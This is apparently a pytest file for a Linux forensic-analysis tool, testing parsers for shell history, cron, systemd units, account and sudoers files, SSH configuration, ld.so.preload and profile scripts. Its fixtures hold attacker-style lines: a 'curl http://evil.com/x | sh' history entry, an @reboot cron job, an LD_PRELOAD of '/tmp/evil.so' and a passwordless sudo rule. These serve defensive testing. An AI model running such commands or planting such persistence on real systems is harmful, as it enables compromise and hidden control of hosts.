"""Unit tests for step-7a parsers: bash_history, cron, systemd_units,
passwd_shadow_sudoers, ssh, ld_preload, profile_scripts."""

from __future__ import annotations

from conftest import make_mini_evidence

from linuxdfir.ingest import Evidence
from linuxdfir.parsers import (
    bash_history,
    cron,
    ld_preload,
    passwd_shadow_sudoers,
    profile_scripts,
    ssh,
    systemd_units,
)


def _parse(parser, tmp_path, files, member):
    root = make_mini_evidence(tmp_path / "mini", files=files)
    with Evidence.open(root) as evidence:
        return list(parser.parse_member(evidence, member))


# ---------------------------------------------------------------- bash_history


class TestBashHistory:
    def test_epoch_line(self, tmp_path):
        events = _parse(
            bash_history,
            tmp_path,
            {"/root/.bash_history": b"#1704150400\ncurl http://evil.com/x | sh\n"},
            "evidence/root/.bash_history",
        )
        assert len(events) == 1
        assert events[0].user == "root"
        assert events[0].timestamp_utc is not None
        assert events[0].timestamp_quality == "exact"
        assert events[0].message == "curl http://evil.com/x | sh"

    def test_plain_command_undated(self, tmp_path):
        events = _parse(
            bash_history,
            tmp_path,
            {"/home/alice/.bash_history": b"ls -la\npwd\n"},
            "evidence/home/alice/.bash_history",
        )
        assert len(events) == 2
        assert all(e.timestamp_utc is None for e in events)
        assert events[0].user == "alice"

    def test_zsh_extended(self, tmp_path):
        events = _parse(
            bash_history,
            tmp_path,
            {"/home/alice/.bash_history": b": 1704150400:0;cat /etc/passwd\n"},
            "evidence/home/alice/.bash_history",
        )
        assert len(events) == 1
        assert events[0].timestamp_utc is not None
        assert events[0].timestamp_quality == "exact"

    def test_viminfo_colon_command(self, tmp_path):
        events = _parse(
            bash_history,
            tmp_path,
            {"/home/alice/.viminfo": b":%s/old/new/g\n/secret-pattern\n# comment\n"},
            "evidence/home/alice/.viminfo",
        )
        types = {e.event_type for e in events}
        assert "vim_command" in types
        assert "vim_search" in types

    def test_huge_line(self, tmp_path):
        blob = b"A" * 100_000 + b"\n"
        events = _parse(
            bash_history,
            tmp_path,
            {"/root/.bash_history": blob},
            "evidence/root/.bash_history",
        )
        assert len(events) == 1

    def test_invalid_utf8_replaced(self, tmp_path):
        events = _parse(
            bash_history,
            tmp_path,
            {"/root/.bash_history": b"\xff\xfe garbage \xc3\x28\n"},
            "evidence/root/.bash_history",
        )
        assert len(events) == 1

    def test_empty_file(self, tmp_path):
        events = _parse(
            bash_history,
            tmp_path,
            {"/root/.bash_history": b""},
            "evidence/root/.bash_history",
        )
        assert events == []


# ------------------------------------------------------------------- cron


class TestCron:
    def test_system_crontab(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/etc/crontab": b"17 * * * * root cd / && run-parts /etc/cron.hourly\n"},
            "evidence/etc/crontab",
        )
        assert len(events) == 1
        assert events[0].event_type == "cron_job"
        assert "root" in events[0].message

    def test_at_reboot(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/etc/cron.d/evil": b"@reboot root /tmp/.x/run.sh\n"},
            "evidence/etc/cron.d/evil",
        )
        assert len(events) == 1
        assert "@reboot" in events[0].message

    def test_spool_user(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/var/spool/cron/crontabs/alice": b"30 8 * * * /home/alice/bin/sync.sh\n"},
            "evidence/var/spool/cron/crontabs/alice",
        )
        assert len(events) == 1
        assert events[0].user == "alice"

    def test_env_assignment(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/var/spool/cron/crontabs/root": b"PATH=/usr/bin\n0 3 * * * /usr/local/bin/backup.sh\n"},
            "evidence/var/spool/cron/crontabs/root",
        )
        types = [e.event_type for e in events]
        assert "cron_env" in types
        assert "cron_job" in types

    def test_run_parts(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/etc/cron.daily/logrotate": b"#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n"},
            "evidence/etc/cron.daily/logrotate",
        )
        assert len(events) == 1
        assert "run-parts" in events[0].message

    def test_anacrontab(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/etc/anacrontab": b"1\t5\tn.daily\t/usr/local/sbin/daily-job\n"},
            "evidence/etc/anacrontab",
        )
        assert len(events) == 1
        assert "every 1d" in events[0].message

    def test_comment_and_blank_skipped(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/etc/crontab": b"# comment\n\n17 * * * * root true\n"},
            "evidence/etc/crontab",
        )
        assert len(events) == 1

    def test_malformed_yields_unparsed(self, tmp_path):
        events = _parse(
            cron,
            tmp_path,
            {"/etc/crontab": b"garbage-without-schedule\n"},
            "evidence/etc/crontab",
        )
        assert len(events) == 1
        assert events[0].event_type == "unparsed"


# ----------------------------------------------------------- systemd_units


class TestSystemdUnits:
    def test_exec_start(self, tmp_path):
        unit = b"[Unit]\nDescription=Update\n[Service]\nExecStart=/dev/shm/.cache/upd --daemon\n"
        events = _parse(
            systemd_units,
            tmp_path,
            {"/etc/systemd/system/system-update.service": unit},
            "evidence/etc/systemd/system/system-update.service",
        )
        execs = [e for e in events if e.event_type == "systemd_exec"]
        assert len(execs) == 1
        assert "/dev/shm/.cache/upd" in execs[0].message

    def test_user_directive(self, tmp_path):
        unit = b"[Service]\nUser=alice\nExecStart=/usr/bin/safe\n"
        events = _parse(
            systemd_units,
            tmp_path,
            {"/etc/systemd/system/test.service": unit},
            "evidence/etc/systemd/system/test.service",
        )
        units = [e for e in events if e.event_type == "systemd_unit"]
        assert units and "alice" in units[0].message

    def test_environment_line(self, tmp_path):
        unit = b"[Service]\nEnvironment=LD_PRELOAD=/tmp/evil.so\nExecStart=/bin/true\n"
        events = _parse(
            systemd_units,
            tmp_path,
            {"/etc/systemd/system/env.service": unit},
            "evidence/etc/systemd/system/env.service",
        )
        envs = [e for e in events if e.event_type == "systemd_env"]
        assert len(envs) == 1
        assert "LD_PRELOAD=/tmp/evil.so" in envs[0].message

    def test_empty_file_no_events(self, tmp_path):
        events = _parse(
            systemd_units,
            tmp_path,
            {"/etc/systemd/system/empty.service": b""},
            "evidence/etc/systemd/system/empty.service",
        )
        assert events == []

    def test_binary_detected(self, tmp_path):
        events = _parse(
            systemd_units,
            tmp_path,
            {"/etc/systemd/system/bin.service": b"\x00\x01\x02\x03" * 100},
            "evidence/etc/systemd/system/bin.service",
        )
        assert any(e.event_type == "unparsed" for e in events)

    def test_huge_file_rejected(self, tmp_path):
        unit = b"[Service]\nExecStart=/bin/true\n" + b"# filler\n" * 100
        blob = unit + b"A" * (1024 * 1024 + 1)
        events = _parse(
            systemd_units,
            tmp_path,
            {"/etc/systemd/system/huge.service": blob},
            "evidence/etc/systemd/system/huge.service",
        )
        assert any("<file too large>" in e.message for e in events)

    def test_parse_manifest_masked(self, tmp_path):
        root = make_mini_evidence(
            tmp_path / "mini",
            files={"/etc/hostname": b"mini\n"},
        )
        import json

        mpath = root / "manifest.json"
        manifest = json.loads(mpath.read_text(encoding="utf-8"))
        manifest["files"].append(
            {
                "original_path": "/etc/systemd/system/auditd.service",
                "archive_path": "evidence/etc/systemd/system/auditd.service",
                "category": "test",
                "status": "ok",
                "type": "symlink",
                "sha256": None,
                "hashable": False,
                "masked": True,
                "symlink_target": "/dev/null",
            }
        )
        mpath.write_text(json.dumps(manifest), encoding="utf-8")
        with Evidence.open(root) as evidence:
            events = list(systemd_units.parse_manifest(evidence))
        assert len(events) == 1
        assert events[0].event_type == "systemd_masked"
        assert "auditd.service" in events[0].evidence_path


# ------------------------------------------------- passwd_shadow_sudoers


class TestPasswdShadowSudoers:
    def test_passwd_valid(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/passwd": b"root:x:0:0:root:/root:/bin/bash\nalice:x:1001:1001:Alice:/home/alice:/bin/bash\n"},
            "evidence/etc/passwd",
        )
        accounts = [e for e in events if e.event_type == "user_account"]
        assert len(accounts) == 2
        assert accounts[0].user == "root"

    def test_passwd_malformed(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/passwd": b"not-a-valid-line\nroot:x:0:0:root:/root:/bin/bash\n"},
            "evidence/etc/passwd",
        )
        assert any(e.event_type == "unparsed" for e in events)
        assert any(e.event_type == "user_account" for e in events)

    def test_shadow_states(self, tmp_path):
        blob = (
            b"root:!:20000:0:99999:7:::\n"
            b"daemon:*:20000:0:99999:7:::\n"
            b"alice:$6$abc:20000:0:99999:7:::\n"
            b"empty::20000:0:99999:7:::\n"
        )
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/shadow": blob},
            "evidence/etc/shadow",
        )
        states = {e.user: e.message.split(": ")[-1] for e in events if e.event_type == "shadow_state"}
        assert states["root"] == "locked"
        assert states["daemon"] == "no-login"
        assert states["alice"] == "has-password"
        assert states["empty"] == "empty"

    def test_shadow_never_keeps_hashes(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/shadow": b"alice:$6$testrounds$abcdefghijklmnopqrstuvwxyz0123456789:20000:0:99999:7:::\n"},
            "evidence/etc/shadow",
        )
        for event in events:
            assert "$6$" not in event.message
            assert "testrounds" not in event.message

    def test_group_entry(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/group": b"adm:x:4:admin,alice\n"},
            "evidence/etc/group",
        )
        assert any(e.event_type == "group_entry" for e in events)

    def test_sudoers_nopasswd(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/sudoers.d/99-backup": b"sysbackup ALL=(ALL) NOPASSWD: ALL\n"},
            "evidence/etc/sudoers.d/99-backup",
        )
        rules = [e for e in events if e.event_type == "sudo_rule"]
        assert len(rules) == 1
        assert "nopasswd" in rules[0].tags

    def test_sudoers_comment_skip(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/sudoers": b"# comment\nroot ALL=(ALL:ALL) ALL\n"},
            "evidence/etc/sudoers",
        )
        assert len(events) == 1
        assert events[0].event_type == "sudo_rule"

    def test_sudoers_defaults_directive(self, tmp_path):
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/sudoers": b"Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n"},
            "evidence/etc/sudoers",
        )
        types = {e.event_type for e in events}
        assert "sudoers_directive" in types
        assert "sudo_rule" in types

    def test_sudoers_line_continuation(self, tmp_path):
        blob = b"root ALL=(ALL:ALL) \\\n  NOPASSWD: ALL\n"
        events = _parse(
            passwd_shadow_sudoers,
            tmp_path,
            {"/etc/sudoers": blob},
            "evidence/etc/sudoers",
        )
        rules = [e for e in events if e.event_type == "sudo_rule"]
        assert rules and "nopasswd" in rules[0].tags


# --------------------------------------------------------------------- ssh


class TestSSH:
    def test_sshd_permit_root_login(self, tmp_path):
        events = _parse(
            ssh,
            tmp_path,
            {"/etc/ssh/sshd_config": b"PermitRootLogin yes\nPasswordAuthentication no\n"},
            "evidence/etc/ssh/sshd_config",
        )
        settings = [e for e in events if e.event_type == "sshd_setting"]
        assert len(settings) == 2
        assert any("PermitRootLogin" in e.message for e in settings)

    def test_sshd_uninteresting_skipped(self, tmp_path):
        events = _parse(
            ssh,
            tmp_path,
            {"/etc/ssh/sshd_config": b"Port 22\nUseDNS no\nLoginGraceTime 120\n"},
            "evidence/etc/ssh/sshd_config",
        )
        assert len(events) == 0

    def test_sshd_match_block_tagged(self, tmp_path):
        blob = b"Match User alice\n  PasswordAuthentication yes\n"
        events = _parse(
            ssh,
            tmp_path,
            {"/etc/ssh/sshd_config": blob},
            "evidence/etc/ssh/sshd_config",
        )
        assert any("match-block" in e.tags for e in events)

    def test_authorized_keys_valid(self, tmp_path):
        key = b"ssh-ed25519 ZmFrZS1rZXktbWF0ZXJpYWw= heretest-key\n"
        events = _parse(
            ssh,
            tmp_path,
            {"/root/.ssh/authorized_keys": key},
            "evidence/root/.ssh/authorized_keys",
        )
        assert len(events) == 1
        assert events[0].event_type == "ssh_key"
        assert "SHA256:" in events[0].message

    def test_authorized_keys_with_options(self, tmp_path):
        key = b'command="/usr/bin/backup" ssh-ed25519 ZmFrZS1rZXktbWF0ZXJpYWw= backup-key\n'
        events = _parse(
            ssh,
            tmp_path,
            {"/root/.ssh/authorized_keys": key},
            "evidence/root/.ssh/authorized_keys",
        )
        assert "key-options" in events[0].tags

    def test_authorized_keys_invalid_blob(self, tmp_path):
        key = b"ssh-ed25519 not-valid-base64!!! comment\n"
        events = _parse(
            ssh,
            tmp_path,
            {"/root/.ssh/authorized_keys": key},
            "evidence/root/.ssh/authorized_keys",
        )
        assert len(events) == 1
        assert "INVALID" in events[0].message

    def test_known_hosts_entry(self, tmp_path):
        events = _parse(
            ssh,
            tmp_path,
            {"/home/alice/.ssh/known_hosts": b"github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRlc3QK\n"},
            "evidence/home/alice/.ssh/known_hosts",
        )
        assert len(events) == 1
        assert events[0].event_type == "ssh_known_host"

    def test_known_hosts_hashed(self, tmp_path):
        events = _parse(
            ssh,
            tmp_path,
            {"/home/alice/.ssh/known_hosts": b"|1|fakehashedhost= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRlc3QK\n"},
            "evidence/home/alice/.ssh/known_hosts",
        )
        assert "hashed" in events[0].tags


# --------------------------------------------------------------- ld_preload


class TestLdPreload:
    def test_single_lib(self, tmp_path):
        events = _parse(
            ld_preload,
            tmp_path,
            {"/etc/ld.so.preload": b"/tmp/.lib/libc.so.6\n"},
            "evidence/etc/ld.so.preload",
        )
        assert len(events) == 1
        assert events[0].event_type == "preload_entry"
        assert "/tmp/.lib/libc.so.6" in events[0].message

    def test_multiple_libs(self, tmp_path):
        events = _parse(
            ld_preload,
            tmp_path,
            {"/etc/ld.so.preload": b"/tmp/a.so\n/lib/x86_64-linux-gnu/libnss.so\n"},
            "evidence/etc/ld.so.preload",
        )
        assert len(events) == 2

    def test_comments_skipped(self, tmp_path):
        events = _parse(
            ld_preload,
            tmp_path,
            {"/etc/ld.so.preload": b"# comment\n/tmp/a.so\n"},
            "evidence/etc/ld.so.preload",
        )
        assert len(events) == 1


# ----------------------------------------------------------- profile_scripts


class TestProfileScripts:
    def test_bashrc_line(self, tmp_path):
        events = _parse(
            profile_scripts,
            tmp_path,
            {"/home/alice/.bashrc": b"# comment\nalias ll='ls -l'\n"},
            "evidence/home/alice/.bashrc",
        )
        assert len(events) == 1
        assert events[0].user == "alice"
        assert events[0].event_type == "startup_line"

    def test_root_profile(self, tmp_path):
        events = _parse(
            profile_scripts,
            tmp_path,
            {"/root/.bashrc": b"export HISTSIZE=5000\n"},
            "evidence/root/.bashrc",
        )
        assert events[0].user == "root"

    def test_profile_d(self, tmp_path):
        events = _parse(
            profile_scripts,
            tmp_path,
            {"/etc/profile.d/hardening.sh": b"export HISTCONTROL=ignoredups\n"},
            "evidence/etc/profile.d/hardening.sh",
        )
        assert len(events) == 1
        assert events[0].user is None
